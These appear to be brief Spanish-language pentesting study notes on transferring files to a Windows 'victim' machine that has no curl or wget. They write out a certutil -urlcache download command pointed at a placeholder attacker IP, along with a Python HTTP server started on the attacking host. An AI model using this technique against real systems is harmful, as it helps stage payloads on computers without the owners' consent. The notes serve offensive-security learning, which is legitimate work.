- Que pasa si en un windows no tenemos las herramientas `curl` y `wget`?
	- Vamos a utilizar la herramienta `certutil` 
- El comando para usar esta herramienta seria:
```
certutil -split -urlcache -f http://(IP ATACANTE)/ELARCHIVOQUE_QUEREMOS_COMPARTIR EL_NOMBRE_QUE_QUEREMOS_DARLE_AL_ARCHIVO.
```

- Vamos a crear un archivo vacío en la maquina atacante, usaremos el comando `touch` .
![[Pasted image 20241211200500.png]]
- Vamos a levantar nuestra pagina http con el comando:
```
python3 -m http.server 80
```
- Vamos a la maquina victima y usamos la herramienta `certutil` .
![](../Imagenes/Pasted%20image%2020241211200816.png)
- Estará cargando y nos saldrá esto:
![](../Imagenes/Pasted%20image%2020241211200853.png)
